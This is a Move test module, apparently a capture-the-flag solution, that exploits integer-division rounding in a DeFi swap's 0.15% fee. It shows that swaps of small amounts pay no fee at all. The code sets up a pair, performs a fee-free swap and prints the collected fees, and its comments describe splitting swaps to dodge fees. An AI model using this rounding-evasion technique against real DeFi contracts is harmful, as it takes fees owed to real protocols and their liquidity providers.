module ctf::attack {
    #[test_only]
    use std::signer::address_of;
    #[test_only]
    use std::string::utf8;
    #[test_only]
    use aptos_std::debug::print;
    #[test_only]
    use aptos_std::math64;
    #[test_only]
    use aptos_std::string_utils;
    #[test_only]
    use aptos_framework::account::create_account_for_test;
    #[test_only]
    use aptos_framework::coin;
    #[test_only]
    use aptos_framework::coin::{register, create_coin_conversion_map};
    #[test_only]
    use ctf::defi_protocol::{initialize_pair, total_fees_collected, execute_swap};

    struct APT {}
    struct USDT {}

    #[test(aptos_framework=@aptos_framework,caller=@ctf)]
    public fun attack(aptos_framework:&signer,caller:&signer){
        create_coin_conversion_map(aptos_framework);
        initialize_pair<APT,USDT>(caller);
        deploy_apt(caller);
        //print_apt_balance (caller);

        execute_swap<APT,USDT>(caller,600);
        //execute_swap<APT,USDT>(caller,1000);
        print_fee ()
    }

    #[test(caller=@ctf)]
    public fun cal_fee(caller:&signer){
        let amount = 0;
        let  fixed_fee = 15;
        while(amount < 10000){
            let fee = amount * fixed_fee /10000;
            // let fee =math64::mul_div(amount,fixed_fee,10000);
            print(&string_utils::format1(&b"fee is ={}",fee));
            amount += 100
        }

        // let fee = 660 * fixed_fee /10000;
        // print(&string_utils::format1(&b"fee is ={}",fee))

        ///this show  from amount 0 - 660 also 0 fee ,since 0-660 * 15 the result are smaller than 10000 ,so wont get fee
        /// the attack just need to swap smaller than 660 amount everytime ,he could avoid to paid fee of swap
    }
    #[test_only]
    fun deploy_apt(caller:&signer){
        create_account_for_test(address_of(caller));
        let (b,f,m)= coin::initialize<APT>(caller,utf8(b"APT"),utf8(b"APT"),8,false);
        register<APT>(caller);

        coin::deposit(address_of(caller),coin::mint(100000000000,&m));
        coin::destroy_mint_cap(m);
        coin::destroy_burn_cap(b);
        coin::destroy_freeze_cap(f);
    }
    #[test_only]
    fun print_apt_balance (caller:&signer){
        let balance =coin::balance<APT>(address_of(caller));
        print(&string_utils::format1(&b"Your balance  = {}",balance));
    }
    #[test_only]
    fun print_fee (){
        let balance = total_fees_collected<APT, USDT>();
        print(&string_utils::format1(&b"Pool fee  = {}",balance));
    }
}
